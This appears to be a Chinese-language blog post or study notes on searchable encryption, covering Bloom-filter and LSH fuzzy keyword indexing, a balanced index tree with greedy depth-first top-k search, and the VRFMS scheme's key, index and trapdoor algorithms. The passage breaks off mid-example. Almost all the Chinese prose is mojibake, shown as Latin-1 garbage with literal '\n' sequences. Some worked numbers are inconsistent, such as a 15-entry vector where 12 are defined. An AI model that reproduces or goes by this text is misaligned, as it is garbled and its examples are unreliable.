bits è¡¨ç¤ºå¸¸ç”¨çš„ç¬¦å·å’Œæ•°å­—ã€‚å¦‚æœç»™å®šçš„ä½è¡¨ç¤ºç›¸åº”çš„ uni-gramï¼Œåˆ™å°†å…¶è®¾ä¸º 1ã€‚\n\né€šè¿‡è¿™ç§æ–¹å¼ï¼Œä¸åŒçš„å…³é”®å­—è¢«è½¬æ¢ä¸º 160 ä½é•¿åº¦çš„å‘é‡è¡¨ç¤ºã€‚æ‹¼å†™é”™è¯¯çš„å…³é”®å­—ä»ç„¶å¯ä»¥è½¬åŒ–ä¸ºä¸å…¶å¯¹åº”çš„æ­£ç¡®å…³é”®å­—é«˜åº¦ç›¸ä¼¼çš„å‘é‡ã€‚\n\n#### åŸºäºBFçš„ç´¢å¼•/æŸ¥è¯¢å‘é‡\n\nå°†åŸå§‹å…³é”®å­—è½¬æ¢ä¸ºå‘é‡åï¼Œä½¿ç”¨ LSH å‡½æ•°å°†å‘é‡æ˜ å°„åˆ° Bloom filterã€‚ä¸ºæ¯ä¸ªæ–‡ä»¶ç”Ÿæˆä¸€ä¸ª m ä½ Bloom è¿‡æ»¤å™¨ï¼Œå¹¶å°†å…¶æ‰€æœ‰å…³é”®å­—å‘é‡æ•£åˆ—åˆ° Bloom è¿‡æ»¤å™¨ä¸Šã€‚æ¯ä¸ªå…³é”®å­—å‘é‡éƒ½ç”¨ l ä¸ªä¸åŒçš„ LSH å‡½æ•°æ•£åˆ—åœ¨ä¸åŒçš„ä½ç½®ä¸Šï¼Œå®ƒä»¬å¯¹åº”çš„ä½ç½®è®¾ç½®ä¸º 1ã€‚åœ¨å®ç°è¿‡ç¨‹ä¸­ï¼Œæ•°å­— â€œ1â€ è¢«æ›¿æ¢ä¸ºå…³é”®å­—æƒé‡ TFï¼Œä»¥åæ˜ å…³é”®å­—å’Œæ–‡ä»¶çš„ç›¸å…³æ€§ã€‚\n\n- TF<sub>i,j</sub> = 1 + |w<sub>j</sub>| / |f<sub>j</sub>|\n  - |w<sub>j</sub>| æ˜¯åœ¨ f<sub>i </sub>ä¸­å…³é”®å­— w<sub>j</sub> çš„æ•°é‡\n  - |f<sub>j</sub>| æ˜¯åœ¨ f<sub>i </sub>ä¸­æ‰€æœ‰å…³é”®å­—çš„æ•°é‡\n\næŸ¥è¯¢å‘é‡å’Œç´¢å¼•å‘é‡çš„å†…ç§¯ï¼ˆå³ Scoreï¼‰åæ˜ äº†æŸ¥è¯¢å’Œæ–‡ä»¶çš„ç›¸å…³æ€§\n\né€šå¸¸ï¼ŒScore > 0 è¡¨ç¤ºæ–‡ä»¶åŒ…å«æŸ¥è¯¢å…³é”®å­—ã€‚ä½†ç”±äºå¸ƒéš†è¿‡æ»¤å™¨çš„å‡é˜³æ€§ï¼Œä¸Šè¿°æƒ…å†µå¹¶éå¦‚æ­¤ã€‚åœ¨æ‰€æå‡ºçš„æ–¹æ¡ˆä¸­ï¼Œè¯¥é˜ˆå€¼è¢«è®¾ç½®ä¸ºTH = lï¼Œè¿™æ„å‘³ç€æ ¹æ®æŸ¥è¯¢åªä¼šé€‰æ‹© Score â‰¥ TH çš„æ–‡ä»¶\n\n![](https://img.jwt1399.top/img/image-20220209112928029.png)\n\n#### ç´¢å¼•æ ‘çš„æ„é€ \n\nä¸ºäº†æé«˜æ¨¡ç³Šæœç´¢çš„æ•ˆç‡ï¼Œè¯¥æ–¹æ¡ˆå¼•å…¥äº†ä¸€ä¸ªå¹³è¡¡çš„äºŒå‰æ ‘æ¥ç»„è£…æ‰€æœ‰çš„å¸ƒéš†ç´¢å¼•å‘é‡ã€‚å› æ­¤ï¼Œå°†åªæ£€ç´¢æœ€éœ€è¦çš„æ–‡ä»¶ï¼Œä»è€Œé¿å…éå†æ ‘ä¸­çš„æ‰€æœ‰ç´¢å¼•å‘é‡ã€‚\n\nç´¢å¼•æ ‘çš„ç»“æ„ï¼š\n\n- å¦‚æœ(n = 2k)ï¼Œ(k = 1,2,3ï¼ŒÂ·Â·Â·)ï¼šæ¯å¯¹å¶èŠ‚ç‚¹ D<sub>2kâˆ’1</sub> å’Œ D<sub>2k</sub> éƒ½ä¼šç”Ÿæˆä¸€ä¸ªçˆ¶èŠ‚ç‚¹ D<sub>u</sub>ï¼Œæ¯ä¸ªçˆ¶èŠ‚ç‚¹ D<sub>uÂ </sub>å­˜å‚¨ä¸€ä¸ªæ»¡è¶³ D<sub>u</sub>[i] = max{D<sub>2kâˆ’1</sub>[i]ï¼ŒD<sub>2k</sub>[i]}çš„ m ä½å‘é‡ï¼›nä¸ºæ–‡ä»¶ä¸ªæ•°\n\n- å¦‚æœ(n = 2k+1)ï¼Œ(k = 1,2,3ï¼ŒÂ·Â·Â·)ï¼šå‰ D<sub>2kÂ </sub>å¶èŠ‚ç‚¹ä»¥ä¸Šæ–¹åŒæ ·çš„æ–¹å¼è¿›è¡Œæ•´åˆã€‚æ­¤å¤–ï¼Œç¬¬ 2k+1 ä¸ªå¶èŠ‚ç‚¹ D<sub>2k+1Â </sub>ä¸ç¬¬ D<sub>2k </sub> ä¸ªèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹è¿›è¡Œæ•´åˆã€‚\n\n- æ¯ä¸ª**å¶èŠ‚ç‚¹**ä¸ä¸€ä¸ªæ–‡ä»¶ç›¸å…³è”ï¼Œå­˜å‚¨ç›¸åº”**æ–‡ä»¶çš„æ ‡è¯†ç¬¦**å’Œ**å¸ƒéš†ç´¢å¼•å‘é‡**ã€‚\n\n- å†…éƒ¨èŠ‚ç‚¹åŸºäºå¶èŠ‚ç‚¹ç”Ÿæˆã€‚\n- **çˆ¶èŠ‚ç‚¹**ç´¢å¼•å‘é‡ä¸­çš„å€¼æ˜¯**å­èŠ‚ç‚¹**ç´¢å¼•å‘é‡ä¸­ç›¸åº”ä½çš„**è¾ƒå¤§å€¼**ã€‚\n  - ä¾‹å¦‚ï¼Œr<sub>21</sub>[3] = max{f<sub>1</sub>[3]ï¼Œf<sub>2</sub>[3]} = max{1.5ï¼Œ1} = 1.5ã€‚\n\nè¿™æ ·**å­èŠ‚ç‚¹**å°±è¢«å®ƒä»¬çš„**çˆ¶èŠ‚ç‚¹è¦†ç›–**ï¼Œè¿™æ„å‘³ç€ä¸€æ—¦çˆ¶èŠ‚ç‚¹ä¸­çš„ç´¢å¼•å‘é‡ä¸æ»¡è¶³æœç´¢æ¡ä»¶ï¼Œå®ƒä»¬çš„å­èŠ‚ç‚¹å°±ä¼šè¢«å¿½ç•¥ã€‚\n\n#### åŸºäºç´¢å¼•æ ‘çš„ top-k æœç´¢\n\næ–¹æ¡ˆä¸­ä½¿ç”¨çš„æœç´¢ç®—æ³•æ˜¯ç”± Xia ç­‰äºº(2016)æå‡ºçš„ GDFSï¼ˆè´ªå©ªæ·±åº¦ä¼˜å…ˆæœç´¢ï¼‰\n\nä¸ºåœ¨å¹³è¡¡äºŒè¿›åˆ¶æ ‘(KBB)ä¸Šæœç´¢é¡¶çº§ç›¸å…³æ–‡ä»¶è€Œè®¾è®¡çš„ç®—æ³•ä¸åŸºäº Bloom ç´¢å¼•å‘é‡çš„æ ‘éå¸¸å…¼å®¹ã€‚\n\nå¦‚å›¾æ‰€ç¤º(GDFS)ï¼Œæ„é€ äº†ä¸€ä¸ªæœç´¢ç»“æœåˆ—è¡¨ï¼Œå³ RListï¼Œå®ƒç”± k æ¡è®°å½•ç»„æˆï¼Œæ¯æ¡è®°å½•å®šä¹‰ä¸º <RScore,FID>ã€‚\n\n- RScore è¡¨ç¤º f<sub>FID</sub> æ–‡ä»¶ä¸ç»™å®šæŸ¥è¯¢çš„å…³è”åˆ†æ•°ã€‚å®ƒæ˜¯ç´¢å¼•å‘é‡ä¸æŸ¥è¯¢å‘é‡(é™·é—¨å‘é‡)çš„å†…ç§¯çš„å€¼ã€‚\n- RList ä¸­çš„è¿™ k æ¡è®°å½•å¯¹åº”äºæœç´¢çš„æ–‡ä»¶ï¼Œå› æ­¤è¿™ä¸ªåˆ—è¡¨æ ¹æ®å®ƒä»¬ä¸ç»™å®šæŸ¥è¯¢çš„ç›¸å…³æ€§ï¼Œä»¥åŠå®ƒä»¬çš„ RScoreï¼ŒæŒ‰ç…§é™åºæ’åºã€‚æˆ‘ä»¬å°† RList ä¸­æœ€å°çš„ RScore è¡¨ç¤ºä¸ºç¬¬ k ä¸ªåˆ†æ•°ï¼Œåˆå§‹åŒ–ä¸ºé˜ˆå€¼ THï¼Œåœ¨æœç´¢è¿‡ç¨‹ä¸­å¯ä»¥ä¿®æ”¹ã€‚\n\nç”±äºå­èŠ‚ç‚¹è¢«å…¶çˆ¶èŠ‚ç‚¹è¦†ç›–ï¼Œæœç´¢ç®—æ³•å¯ä»¥æ›´å¿«ï¼Œè¿™æ˜¯å› ä¸ºè¿›ç¨‹åªéœ€è¦æœç´¢ç´¢å¼•æ ‘çš„ä¸€å°éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ ‘ã€‚ä¾‹å¦‚ï¼Œå¯¹äºæ–‡ä»¶é›†åˆ f = {f1ï¼Œf2ï¼Œâ€¦ï¼Œf7}ï¼Œk = 2ï¼Œé˜ˆå€¼ TH = 2ï¼ŒæŸ¥è¯¢å‘é‡å°†ä¸º q =ï¼ˆ0,1,1,0,0ï¼‰ï¼Œæœç´¢è¿‡ç¨‹å¦‚å›¾æ‰€ç¤º\n\n![](https://img.jwt1399.top/img/image-20220209135149217.png)\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œåœ¨æ–‡ä»¶é›†åˆ f = {f1ï¼Œf2ï¼Œâ€¦ï¼Œf7}ï¼Œæˆ‘ä»¬æœç´¢æœ€ç›¸å…³çš„ 2 ä¸ªæ–‡ä»¶(k=2)åˆ°æŸ¥è¯¢ q = (0,1,1,0,0)ã€‚è¿™é‡Œï¼Œç›¸å…³é˜ˆå€¼ TH = 2ã€‚æœç´¢è¿‡ç¨‹ä»æ ¹èŠ‚ç‚¹å¼€å§‹ã€‚ç›¸å…³æ€§å¾—åˆ†S<sub>r</sub> = 2.7 > TH = 2ï¼ˆå› ä¸ºæŸ¥è¯¢å‘é‡ç¬¬2ï¼Œ3ä½ä¸º1ï¼Œæ‰€ä»¥è®¡ç®—Scoreæ˜¯è®¡ç®—2ï¼Œ3ä½æ•°å­—ä¹‹å’Œï¼‰ï¼Œæœç´¢ r<sub>11</sub>ï¼Œå› ä¸ºS<sub>r</sub><sub>11</sub> = 2.7 > S<sub>r12</sub>= 2.2 > THã€‚åœ¨ä¸‹ä¸€è·³ä¸­ï¼Œr<sub>21</sub> åœ¨æœç´¢ä¸­è¢«é€‰ä¸­ï¼Œåé¢è·Ÿç€ f<sub>1</sub>ã€‚S<sub>f1</sub> = 2.7 > THï¼Œå°† f1 æ·»åŠ åˆ°ç»“æœåˆ—è¡¨ä¸­ï¼Œè¿”å›åˆ° r<sub>21</sub>ï¼Œå½“æœç´¢åˆ°è¾¾ f<sub>2</sub> æ—¶ï¼Œæ·»åŠ  f<sub>2</sub>ã€‚æ³¨æ„ï¼ŒS<sub>r22</sub> = 1 < THï¼Œå› æ­¤è¿›ç¨‹å°†åœæ­¢æœç´¢å…¶å­èŠ‚ç‚¹ï¼Œç„¶åæœç´¢ f<sub>7</sub>ï¼ŒS<sub>f7</sub> = 2.2 > S<sub>f2</sub> = 2.1 > THï¼Œå› æ­¤ f<sub>2</sub> è¢«åˆ é™¤ï¼Œf<sub>7</sub> è¢«æ·»åŠ åˆ°ç»“æœåˆ—è¡¨ä¸­ã€‚æœ€åï¼Œæˆ‘ä»¬å¾—åˆ°æœç´¢ç»“æœ f<sub>1</sub>ï¼Œf<sub>7</sub>\n\n##  â‘¤VRFMSæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠVRFMS: Verifiable Ranked Fuzzy Multi-keyword Search over Encrypted Dataã€‹**\n\n- ä½œè€…ï¼šæå…´å; ç«¥ç§‹äº‘; èµµé‡‘ä¼Ÿ; è‹—é“¶æ–Œ; é©¬æ€çª; ç¿å¥; é©¬å‰‘å³°; Kim-Kwang Raymond\n- å•ä½ï¼šè¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦\n- åˆŠç‰©ï¼š[IEEE TRANSACTIONS ON SERVICES COMPUTING](https://ieeexplore.ieee.org/abstract/document/9669122)ã€CCF Bã€‘\n- æ—¶é—´ï¼š2022å¹´1æœˆ\n- æ–¹æ¡ˆç²¾åº¦\n  - ç²¾ç¡®æœç´¢100%\n  - æ¨¡ç³Šæœç´¢91%\n\n### 1ã€æ€»ä½“æ€è·¯\n\nè¯¥æ–¹æ¡ˆé¦–å…ˆå¯¹ç°æœ‰çš„ LSH å’Œ BF ä½“ç³»ç»“æ„è¿›è¡Œäº†æ”¹è¿›ï¼Œä»¥å®ç°é«˜ç²¾åº¦çš„æ¨¡ç³Šå…³é”®å­—æœç´¢ã€‚éšååˆ†åˆ«å¼•å…¥åŒæ€ MAC å’ŒéšæœºæŒ‘æˆ˜æŠ€æœ¯æ¥éªŒè¯è¿”å›ç»“æœçš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§ã€‚\n\næœ¬æ–‡çš„ä¸»è¦è´¡çŒ®å½’çº³å¦‚ä¸‹:\n\n- ï¼ˆ1ï¼‰ä½¿ç”¨ LSHã€BF å’Œ TF-IDF æ”¯æŒæ¨¡ç³Šå¤šå…³é”®å­—æœç´¢\n- ï¼ˆ2ï¼‰è®¾è®¡äº†ä¸€ç§æ”¹è¿›çš„ bi-gram å…³é”®å­—å˜æ¢æ–¹æ³•ï¼Œè€ƒè™‘åˆ°ç›¸åŒ bi-gram çš„å‡ºç°ï¼Œè¿›ä¸€æ­¥æé«˜äº†æ¨¡ç³Šå…³é”®å­—æœç´¢çš„å‡†ç¡®æ€§ï¼Œæœ€é«˜å‡†ç¡®ç‡å¯è¾¾ 91%\n- ï¼ˆ3ï¼‰åˆ©ç”¨åŒæ€ MAC å’ŒéšæœºæŒ‘æˆ˜æŠ€æœ¯æ¥ä¿è¯æœç´¢ç»“æœçš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§ã€‚\n\n### 2ã€ä½¿ç”¨æŠ€æœ¯\n\n- å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°\n- å¸ƒéš†è¿‡æ»¤å™¨\n- å®‰å…¨è¿‘é‚»ç®—æ³•\n- bi-gram å…³é”®å­—å˜æ¢\n- æ³¢ç‰¹è¯å¹²ç®—æ³•\n- è¯é¢‘-é€†æ–‡æ¡£é¢‘åº¦ï¼ˆTF-IDFï¼‰\n\n\n------\n\n### 3ã€æ–¹æ¡ˆå®ç°\n\n![](https://img.jwt1399.top/img/image-20220209170116580.png)\n\n####  å¯†é’¥ç”Ÿæˆç®—æ³•\n\nKeyGen(1<sup>Î»</sup>, m)â†’SKå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼šï¼ˆÎ»ï¼šéšæœºå®‰å…¨å‚æ•°ï¼Œmï¼šç´¢å¼•é•¿åº¦ï¼‰\n\n- ï¼ˆ1ï¼‰æ ¹æ®å®‰å…¨å‚æ•° Î»ï¼Œæ•°æ®æ‰€æœ‰è€…è°ƒç”¨ RealHomMacï¼Œç”Ÿæˆå¯†é’¥ï¼ˆKï¼ŒÎ±ï¼‰\n\n- ï¼ˆ2ï¼‰éšæœºæ„å»º 2 ä¸ª(m+2) Ã— (m+2) ç»´çš„çŸ©é˜µ M<sub>1</sub> , M<sub>2</sub> âˆˆ ï¼²<sup>(m+2) Ã— (m+2)</sup>\n- ï¼ˆ3ï¼‰éšæœºæ„å»ºä¸€ä¸ª m+2 ç»´çš„å‘é‡ S âˆˆ { 0 , 1 }<sup>m+2</sup> ï¼Œä¸” S ä¸­ 0 å’Œ 1 çš„æ•°é‡éœ€è¦å¤§è‡´ç›¸åŒ\n- ï¼ˆ4ï¼‰è¾“å‡º SK = (Kï¼Œ Î±ï¼ŒM<sub>1</sub>ï¼ŒM<sub>2</sub>ï¼ŒS) ä½œä¸º**ç”ŸæˆåŠ å¯†ç´¢å¼•**å’Œ**ç”Ÿæˆé™·é—¨**çš„**å¯†é’¥**\n\n#### ç´¢å¼•ç”Ÿæˆç®—æ³•\n\nBuildIndex(F, SK)â†’Enc<sub>sk</sub>(I)ç”Ÿæˆå®‰å…¨ç´¢å¼•ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹:ï¼ˆFï¼šæ–‡ä»¶é›†åˆï¼ŒSKï¼šå¯†é’¥ï¼‰\n\n- **ï¼ˆ1ï¼‰æ•°æ®é¢„å¤„ç†**\n  - å¯¹äºæ–‡ä»¶é›†åˆ F = { f<sub>1</sub> , f<sub>2</sub> ,â€¦, f<sub>n</sub> }ä¸­çš„æ¯ä¸€ä¸ªæ–‡ä»¶ f<sub>i</sub> æ‰€å¯¹åº”çš„å…³é”®å­—é›†åˆ W<sub>i</sub> = { w<sub>1</sub> , w<sub>2</sub> ,â€¦, w<sub>t</sub> }ï¼Œä½¿ç”¨ [æ³¢ç‰¹è¯å¹²ç®—æ³•](https://tartarus.org/martin/PorterStemmer/) å°†è·å¾—è¯å¹²å…³é”®è¯é›†åˆ ST = { st<sub>1</sub> , st<sub>2</sub> ,â€¦, st<sub>t</sub> }ï¼Œæ ¹æ® ST è®¡ç®— TF å’Œ IDF å€¼\n- **ï¼ˆ2ï¼‰å…³é”®è¯è½¬æ¢**\n  - ä½¿ç”¨æ”¹è¿›çš„å…³é”®å­—è½¬æ¢æ–¹æ³• bi-gramï¼Œå°†æ¯ä¸ªå…³é”®å­—è½¬æ¢ä¸ºé›†åˆ BSï¼Œè€ƒè™‘äº†ç›¸åŒ bi-gram çš„å‡ºç°ï¼Œç„¶åå°† BS è½¬æ¢ä¸ºå›ºå®šé•¿åº¦çš„äºŒè¿›åˆ¶å‘é‡ BV \n  - ä¾‹å¦‚ï¼Œå…³é”®å­— \"represent\" è¡¨ç¤º BS = {re<sub>1</sub>ï¼Œep<sub>1</sub>ï¼Œpr<sub>1</sub>ï¼Œre<sub>2</sub>ï¼Œes<sub>1</sub>ï¼Œse<sub>1</sub>ï¼Œen<sub>1</sub>ï¼Œnt<sub>1</sub>}\n- **ï¼ˆ3ï¼‰æ„å»ºç´¢å¼•**\n  - â‘  ä¸ºæ–‡ä»¶ f<sub>i</sub> æ„å»ºä¸€ä¸ª m bit çš„**å¸ƒéš†è¿‡æ»¤å™¨ B**<sub>i</sub>ï¼Œåˆå§‹åŒ–ä¸º 0 \n  - â‘¡å¯¹äºå‘é‡é›†åˆ BV = { bv<sub>1</sub> , bv<sub>2</sub> ,â€¦, bv<sub>t</sub> } ä¸­çš„æ¯ä¸ªå‘é‡ bv<sub>i</sub>ï¼Œä½¿ç”¨ l ä¸ª**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°** { H<sub>1</sub> , H<sub>2</sub> ,â€¦, H<sub>l</sub>  } è¿›è¡Œè®¡ç®—(H<sub>1</sub>(bv<sub>i</sub>) , H<sub>2</sub>(bv<sub>i</sub>) ,â€¦, H<sub>l</sub>(bv<sub>i</sub>) )ï¼Œè®¡ç®—åœ¨ B<sub>i</sub> ä¸­ç›¸åº”çš„ä½ç½® ï¼Œå¹¶å°†æ¯ä¸ªä½ç½®è®¾ç½®ä¸º TF<sub>i,j</sub> / l\n    - TF<sub>i,j</sub> = 1 + |w<sub>j</sub>| / |f<sub>j</sub>|ï¼Œ |w<sub>j</sub>| æ˜¯åœ¨ f<sub>i </sub>ä¸­å…³é”®å­— w<sub>j</sub> çš„æ•°é‡ï¼Œ|f<sub>j</sub>| æ˜¯åœ¨ f<sub>i </sub>ä¸­æ‰€æœ‰å…³é”®å­—çš„æ•°é‡\n    - å¦‚æœå°†ä¸åŒçš„å…³é”®å­—æ•£åˆ—åˆ°åŒä¸€ä½ç½®ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒä»¬çš„å¹³å‡å€¼ä½œä¸ºæ’å…¥\n  - â‘¢ å°†  B<sub>i</sub> æ‰©å±•ä¸º (m+2) ä½ï¼Œæ‰©å±•å€¼ä¸º Îµ<sub>1Â </sub>å’Œ 1\n- **ï¼ˆ4ï¼‰ç´¢å¼•åŠ å¯†**\n  - â‘ å°†å¯†é’¥ SK ä¸­çš„ S è¡¨ç¤ºä¸º S = (s<sub>1</sub> , s<sub>2</sub> ,â€¦, s<sub>m+2</sub>)ã€‚å¯¹äºæ¯ä¸€ä¸ªæ–‡ä»¶ f<sub>i</sub> æ‰€å¾—åˆ°çš„å¸ƒéš†è¿‡æ»¤å™¨ B<sub>i</sub>\n  -  éšæœºé€‰æ‹©å‚æ•° r âˆˆ  R\n  - â‘¡ å°† B<sub>i</sub>  è¡¨ç¤ºä¸º B<sub>i</sub> = ( b<sub>1</sub> , b<sub>2</sub> ,â€¦, b<sub>m+2</sub>)ã€‚ B<sub>i</sub>  ä¸ S å…·æœ‰åŒæ ·çš„ç»“æ„ï¼Œå‡ä¸ºç”± {0,1} ç»„æˆçš„ m+2 ä½å‘é‡ã€‚å¯¹äº B<sub>i</sub> ä¸­çš„æ¯ä¸€ä¸ª b<sub>j</sub> ï¼Œ\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 1 ï¼Œåˆ™ä»¤ b'<sub>j</sub> =  b''<sub>j</sub> = b<sub>j</sub> ï¼›\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 0ï¼Œåˆ™ä»¤ b'<sub>j</sub> = 1/2b<sub>j</sub> + r  ã€b''<sub>j</sub> = 1/2b<sub>j</sub> - r\n  - â‘¢ ä»¤ B'<sub>iÂ </sub> =  ( b'<sub>1</sub> , b'<sub>2</sub> ,â€¦, b'<sub>m+2</sub>)ï¼ŒB\"<sub>i </sub> =  ( b\"<sub>1</sub> , b\"<sub>2</sub> ,â€¦, b\"<sub>m+2</sub>)\n  - â‘£ è®¡ç®— I'<sub>i</sub> = M<sub>1</sub><sup>T</sup> â€¢ B'<sub>i </sub> , I\"<sub>i</sub> = M<sub>2</sub><sup>T</sup> â€¢ B\"<sub>i </sub> \n  - â‘¤ ä»¤  I<sub>i</sub> = (I'<sub>i</sub> ï¼ŒI\"<sub>i</sub> ) \n  - â‘¥è¾“å‡ºåŠ å¯†ç´¢å¼• Enc<sub>sk</sub>(I)= ( I<sub>1</sub> , I<sub>2</sub> ,â€¦, I<sub>n</sub> )ï¼Œn æ˜¯æ–‡ä»¶é›†åˆä¸­çš„æ–‡ä»¶æ•°\n\n**ç´¢å¼•ç”Ÿæˆå®ä¾‹**\n\næˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®ä¾‹å±•ç¤ºäº†ç´¢å¼•çš„å»ºç«‹è¿‡ç¨‹ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å‡è®¾æŸä¸ªæ–‡ä»¶æœ‰ä¸¤ä¸ªå…³é”®å­—â€œrankedâ€å’Œâ€œsearchedâ€\n\n- W = {rankedï¼Œsearched}ï¼Œè®¾ m = 10ï¼ŒS = [1,0,0,1,0,0,1,1,0,0,1,1] ï¼Œå¹¶å‡è®¾ï¼ˆM1ï¼ŒM2ï¼‰éƒ½æ˜¯å¯é€†çŸ©é˜µã€‚\n- é¦–å…ˆ å¯¹ W ç”¨æ³¢ç‰¹è¯å¹²ç®—æ³•è½¬æ¢ä¸º ST = {rankï¼Œsearch}\n- å…³é”®å­— â€œrankâ€ ä½¿ç”¨ bi-gram è½¬æ¢ä¸º BS<sub>1</sub>= {ra<sub>1</sub>ï¼Œan<sub>1</sub>ï¼Œnk<sub>1</sub>}ï¼Œå†è½¬æ¢ä¸º BV<sub>1</sub> \n- BS<sub>2</sub> å’Œ BV<sub>2</sub> æ˜¯ç”¨åŒæ ·çš„æ–¹æ³•ä¸ºå…³é”®å­— â€œsearchâ€ ç”Ÿæˆçš„\n- åˆ†åˆ«ä½¿ç”¨ BV<sub>1</sub> å’Œ BV<sub>2</sub> ä½œä¸º LSH å‡½æ•°çš„ä¸¤ä¸ªè¾“å…¥ï¼Œå¹¶åœ¨å…¶è®¡ç®—ç»“æœçš„ä½ç½®è®¾ç½® TF å€¼ 0.5\n- B<sub>i</sub>  = [0.5,0,0,0,0,0,0,0.5,0,0.5]ï¼Œå®ƒè¢«æ‰©å±•ä¸º[0.5,0,0,0,0,0,0,0,0,0,0,0.5,0.5,0.5,1]ï¼Œä½¿ç”¨å€¼ 0.5 å’Œ 1 ã€‚\n- B'<sub>i </sub>= [0.5, 0.1, 0.1, 0,0.1, 0.35, 0, 0.5, 0.1, 0.35, 0.5, 1]ï¼ŒB\"<sub>i </sub> = [0.5, -0.1, -0.1, 0,-0.1, 0.15, 0, 0.5, -0.1, 0.15, 0.5, 1]\n- æœ€åï¼Œ B'<sub>i </sub> å’Œ B\"<sub>i </sub> ç”¨çŸ©é˜µï¼ˆM<sub>1</sub> , M<sub>2</sub>ï¼‰åŠ å¯†ï¼Œæœ€åçš„ç»“æœæ˜¯Enc<sub>sk</sub>(I<sub>i</sub>) = { I'<sub>i</sub> = M<sub>1</sub><sup>T</sup> â€¢ B'<sub>i </sub> , I\"<sub>i</sub> = M<sub>2</sub><sup>T</sup> â€¢ B\"<sub>i </sub> } =[0.5,0.1,0.1,0.1,0,0.1,0.35,0.5,0.1,0.35,0.5,0.5,-0.1,-0.1,-0.1,0.15,0.5,-0.1]\n\n#### é™·é—¨ç”Ÿæˆç®—æ³•\n\nTrapdoor(W<sub>k</sub>, SK)â†’Enc<sub>sk</sub>(Q)æ ¹æ®æŸ¥è¯¢å…³é”®è¯é›†åˆç”Ÿæˆå®‰å…¨é™·é—¨ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹:\n\n- ï¼ˆ1ï¼‰å‰ä¸¤æ­¥ä¸ç´¢å¼•å»ºç«‹ç”Ÿæˆ BV çš„å‰ä¸¤ä¸ªæ­¥éª¤å®Œå…¨ç›¸åŒ\n- ï¼ˆ2ï¼‰æ„å»ºä¸€ä¸ª m ä½çš„å¸ƒéš†è¿‡æ»¤å™¨ Q ã€‚\n- ï¼ˆ3ï¼‰ä½¿ç”¨ LSH å‡½æ•°å°†æ¯ä¸ªå…³é”®å­—çš„ bi-gram å‘é‡æ˜ å°„åˆ°å¸ƒéš†è¿‡æ»¤å™¨ Q ä¸­ï¼Œå°† Q çš„å¯¹åº”ä½ç½®è®¾ç½®ä¸ºå…¶ IDF å€¼ï¼Œå°†é™·é—¨å‘é‡ Q ä¹˜ä»¥ Îµ<sub>2</sub>ï¼Œå¹¶å°†å…¶æ‰©å±•ä¸ºï¼ˆm+2ï¼‰ä½å‘é‡ï¼Œå…¶å€¼ä¸º Îµ<sub>2</sub> å’Œ t \n- ï¼ˆ4ï¼‰å°†å¯†é’¥ sk ä¸­çš„ S è¡¨ç¤ºä¸º S = (s<sub>1</sub> , s<sub>2</sub> ,â€¦, s<sub>m+2</sub>)ã€‚å¯¹äºå¸ƒéš†è¿‡æ»¤å™¨ Qï¼Œ\n\n  - â‘  éšæœºé€‰æ‹©å‚æ•° r' âˆˆ  R\n  - â‘¡ å°† Q<sub>i</sub>  è¡¨ç¤ºä¸º Q<sub>i</sub> = (q<sub>1</sub> , q<sub>2</sub> ,â€¦, q<sub>m+2</sub>)ã€‚ Q<sub>i</sub>  ä¸ S å…·æœ‰åŒæ ·çš„ç»“æ„ï¼Œå‡ä¸ºç”± {0,1} ç»„æˆçš„ m+2 ä½å‘é‡ã€‚å¯¹äº Q ä¸­çš„æ¯ä¸€ä¸ª q<sub>j</sub> ï¼Œ\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 0 ï¼Œåˆ™ä»¤ q'<sub>j</sub> =  q''<sub>j</sub> = q<sub>j</sub> ï¼Œ\n    - è‹¥åœ¨ S ä¸­å¯¹åº”çš„ s<sub>j</sub> = 1ï¼Œåˆ™ä»¤ q'<sub>j</sub> = 1/2q<sub>j</sub> + r'  ã€q''<sub>j</sub> = 1/2q<sub>j</sub> - r'\n  - â‘¢ ä»¤ Q' =  ( q'<sub>1</sub> , q'<sub>2</sub> ,â€¦, q'<sub>m+2</sub>)ï¼ŒQ\" =  ( q\"<sub>1</sub> , q\"<sub>2</sub> ,â€¦, q\"<sub>m+2</sub>)\n- ï¼ˆ5ï¼‰è¾“å‡ºé™·é—¨ Enc<sub>sk</sub>(Q) = {M<sub>1</sub><sup>-1</sup> â€¢ Q' , M<sub>2</sub><sup>-1</sup> â€¢ Q\"}ã€‚\n\n**é™·é—¨ç”Ÿæˆå®ä¾‹**\n\næˆ‘ä»¬é€šè¿‡ä¸€ä¸ªå®ä¾‹å±•ç¤ºäº†é™·é—¨çš„å»ºç«‹è¿‡ç¨‹ã€‚ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å‡è®¾æŸ¥è¯¢å…³é”®å­—ä¸º â€œrankedâ€ å’Œ â€œsearchedâ€\n\n- BS<sub>1</sub> ï¼Œ BV<sub>1</sub>ï¼ŒBS<sub>2</sub> ï¼Œ BV<sub>2</sub> æ˜¯ç”¨ç´¢å¼•çš„å»ºç«‹è¿‡ç¨‹åŒæ ·æ–¹æ³•ç”Ÿæˆçš„\n- åˆ†åˆ«ä½¿ç”¨ BV<sub>1</sub> å’Œ BV<sub>2</sub> ä½œä¸º LSH å‡½æ•°çš„ä¸¤ä¸ªè¾“å…¥ï¼Œå¹¶åœ¨å…¶è®¡ç®—ç»“æœçš„ä½ç½®è®¾ç½® IDF å€¼ log(0.5) = -0.3\n- Q  = [0, -0.3, 0, 0, 0, -0.3, 0, -0.3, 0, 